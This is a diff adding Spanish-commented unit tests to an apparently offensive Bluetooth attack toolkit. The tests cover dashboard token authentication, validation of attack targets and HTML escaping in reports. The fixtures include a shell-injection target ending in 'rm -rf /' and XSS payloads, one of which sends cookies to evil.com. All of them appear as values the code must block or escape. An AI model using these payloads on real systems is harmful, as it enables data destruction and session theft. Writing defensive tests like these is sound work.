@@ -643,5 +643,239 @@ class TestCrackleScapyNotBlocking(unittest.TestCase):
         self.assertTrue(ok, f"MAC válida debe pasar: {msg}")
 
 
+# ─── Autenticación por token en dashboard web ──────────────────────────────
+
+class TestWebTokenAuth(unittest.TestCase):
+    """Middleware de autenticación por token opcional en web/app.py.
+
+    Si se configura auth_token, TODAS las peticiones deben incluirlo
+    (header Authorization: Bearer <token> o query ?token=<token>).
+    Mitiga el riesgo de exponer el dashboard con --host 0.0.0.0.
+    """
+
+    def setUp(self):
+        try:
+            import flask  # noqa: F401
+        except ImportError:
+            self.skipTest("Flask no disponible en este entorno")
+        from bluesky.web.app import create_app
+        self.create_app = create_app
+
+    def test_01_no_token_no_auth(self):
+        """Sin auth_token, behavior actual (sin auth)."""
+        app = self.create_app(debug=False)
+        client = app.test_client()
+        r = client.get('/api/status')
+        self.assertEqual(r.status_code, 200)
+
+    def test_02_token_required_blocks_unauthenticated(self):
+        """Con auth_token, petición sin token devuelve 401."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.get('/api/status')
+        self.assertEqual(r.status_code, 401)
+        data = r.get_json()
+        self.assertIn("No autorizado", data.get("error", ""))
+
+    def test_03_token_in_header_authorizes(self):
+        """Token correcto en header Authorization: Bearer autoriza."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.get('/api/status',
+                       headers={'Authorization': 'Bearer secret123'})
+        self.assertEqual(r.status_code, 200)
+
+    def test_04_token_in_query_param_authorizes(self):
+        """Token correcto en query ?token= autoriza (para navegador)."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.get('/api/status?token=secret123')
+        self.assertEqual(r.status_code, 200)
+
+    def test_05_wrong_token_blocked(self):
+        """Token incorrecto devuelve 401."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.get('/api/status',
+                       headers={'Authorization': 'Bearer wrong'})
+        self.assertEqual(r.status_code, 401)
+
+    def test_06_html_pages_return_text_plain_401(self):
+        """Páginas HTML (no /api/) devuelven 401 text/plain, no JSON."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.get('/')
+        self.assertEqual(r.status_code, 401)
+        self.assertIn('text/plain', r.content_type)
+
+    def test_07_post_with_token_passes_auth_and_csrf(self):
+        """POST con token correcto pasa auth y pasa CSRF (sin Origin)."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.post('/api/scan',
+                        json={'scanner': 'device'},
+                        headers={'Authorization': 'Bearer secret123'})
+        # No debe ser 401 (auth) ni 403 (CSRF)
+        self.assertNotIn(r.status_code, (401, 403))
+
+    def test_08_post_without_token_blocked_by_auth_not_csrf(self):
+        """POST sin token se bloquea por auth ANTES de CSRF (401, no 403)."""
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        r = client.post('/api/scan', json={'scanner': 'device'})
+        # Auth se ejecuta primero → 401, no 403
+        self.assertEqual(r.status_code, 401)
+
+    def test_09_token_comparison_is_constant_time(self):
+        """Comparación de token usa hmac.compare_digest (timing-safe).
+
+        No podemos medir timing directamente en tests, pero podemos
+        verificar que el módulo usa hmac. Al menos confirmamos que
+        tokens parciales NO se aceptan (sería bug si usara startswith).
+        """
+        app = self.create_app(debug=False, auth_token='secret123')
+        client = app.test_client()
+        # Token parcial (prefijo) → debe bloquear
+        r = client.get('/api/status',
+                       headers={'Authorization': 'Bearer secret'})
+        self.assertEqual(r.status_code, 401,
+                         "Token parcial no debe aceptarse")
+
+
+# ─── Wildcards en BaseModule.check_prerequisites ────────────────────────────
+
+class TestBaseModuleWildcards(unittest.TestCase):
+    """BaseModule.check_prerequisites admite wildcards all/*/broadcast.
+
+    Algunos módulos (btspam) aceptan target='all' para atacar a todos
+    los dispositivos detectados. La validación MAC global no debe
+    bloquear estos wildcards legítimos.
+    """
+
+    def setUp(self):
+        from bluesky.core.engine import BaseModule
+
+        class TestMod(BaseModule):
+            name = "test_wildcards"
+            module_options = {"TARGET": "MAC o 'all' (vacío = todos)"}
+
+            def run(self, target="", options=None):
+                return {"success": True, "data": {}, "error": None}
+
+        self.TestMod = TestMod
+
+    def test_01_target_all_allowed(self):
+        """target='all' se permite (wildcard)."""
+        m = self.TestMod(target='all')
+        ok, _ = m.check_prerequisites()
+        self.assertTrue(ok, "target='all' debe permitirse")
+
+    def test_02_target_star_allowed(self):
+        """target='*' se permite (wildcard)."""
+        m = self.TestMod(target='*')
+        ok, _ = m.check_prerequisites()
+        self.assertTrue(ok, "target='*' debe permitirse")
+
+    def test_03_target_broadcast_allowed(self):
+        """target='broadcast' se permite (wildcard)."""
+        m = self.TestMod(target='broadcast')
+        ok, _ = m.check_prerequisites()
+        self.assertTrue(ok, "target='broadcast' debe permitirse")
+
+    def test_04_target_uppercase_all_allowed(self):
+        """target='ALL' (mayúsculas) se permite (case-insensitive)."""
+        m = self.TestMod(target='ALL')
+        ok, _ = m.check_prerequisites()
+        self.assertTrue(ok, "target='ALL' debe permitirse")
+
+    def test_05_target_malicious_still_blocked(self):
+        """Target malicioso que no es wildcard ni MAC se bloquea."""
+        m = self.TestMod(target='--evil-flag')
+        ok, _ = m.check_prerequisites()
+        self.assertFalse(ok, "target malicioso debe bloquearse")
+
+    def test_06_target_shell_injection_blocked(self):
+        """Target con shell injection se bloquea."""
+        m = self.TestMod(target='AA:BB:CC:DD:EE:FF; rm -rf /')
+        ok, _ = m.check_prerequisites()
+        self.assertFalse(ok)
+
+
+# ─── Integración end-to-end: datos hostiles en flujo completo ──────────────
+
+class TestEndToEndHostileData(unittest.TestCase):
+    """Tests de integración con datos hostiles en el flujo completo.
+
+    Cubre: un dispositivo BT hostil (nombre malicioso) detectado por
+    VulnScanner, cuyo reporte HTML debe escapar todos los datos.
+    """
+
+    def test_01_vuln_scanner_report_with_hostile_device_name(self):
+        """Reporte de VulnScanner con dispositivo hostil no ejecuta JS."""
+        import os
+        from bluesky.modules.scanners.vuln_scanner import VulnScanner
+
+        v = VulnScanner(target='AA:BB:CC:DD:EE:FF')
+        # Simular device_info con nombre hostil (como si viniera de
+        # bluetoothctl info de un dispositivo malicioso)
+        device_info = {
+            'name': '<script>fetch("//evil.com/?"+document.cookie)</script>',
+            'class': 'Phone',
+            'manufacturer': '<img src=x onerror=alert(1)>',
+        }
+        found = [
+            {'id': 'KNOB', 'name': 'KNOB attack', 'cve': 'CVE-2019-9506',
+             'severity': 'critical', 'evidence': 'normal',
+             'module': 'knob'},
+            {'id': 'BIAS', 'name': 'BIAS attack', 'cve': 'CVE-2020-10135',
+             'severity': 'critical', 'evidence': 'normal',
+             'module': 'bias'},
+        ]
+        report_path = v._generate_report(
+            'AA:BB:CC:DD:EE:FF', [], found, device_info)
+        try:
+            content = open(report_path).read()
+            # Verificar que el JS hostil NO está crudo
+            self.assertNotIn('<script>fetch', content,
+                            'JS hostil no escapado en nombre de dispositivo')
+            self.assertNotIn('<img src=x onerror', content,
+                            'img onerror no escapado en manufacturer')
+            # Y sí está escapado
+            self.assertIn('&lt;script&gt;fetch', content)
+            self.assertIn('&lt;img src=x onerror', content)
+        finally:
+            if os.path.exists(report_path):
+                os.unlink(report_path)
+
+    def test_02_autopilot_report_with_hostile_vuln_id(self):
+        """Reporte de Autopilot con vuln ID hostil no ejecuta JS."""
+        import os
+        from bluesky.modules.attacks.autopilot import Autopilot
+
+        targets = [{'mac': 'AA:BB:CC:DD:EE:FF', 'name': 'Phone',
+                    'type': 'classic'}]
+        all_vulns = {
+            'AA:BB:CC:DD:EE:FF': [
+                {'id': '<script>alert("pwned")</script>',
+                 'name': 'evil vuln', 'severity': 'critical',
+                 'vulnerable': True, 'module': 'knob'}],
+        }
+        results = {
+            'AA:BB:CC:DD:EE:FF': [
+                {'module': 'knob', 'target': 'AA:BB:CC:DD:EE:FF',
+                 'success': True, 'data': {}, 'error': None}],
+        }
+        a = Autopilot()
+        report_path = a._phase_report(targets, results, all_vulns)
+        try:
+            content = open(report_path).read()
+            self.assertNotIn('<script>alert("pwned")</script>', content,
+                            'JS hostil no escapado en vuln ID')
+            self.assertIn('&lt;script&gt;alert', content)
+        finally:
+            if os.path.exists(report_path):
+                os.unlink(report_path)
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
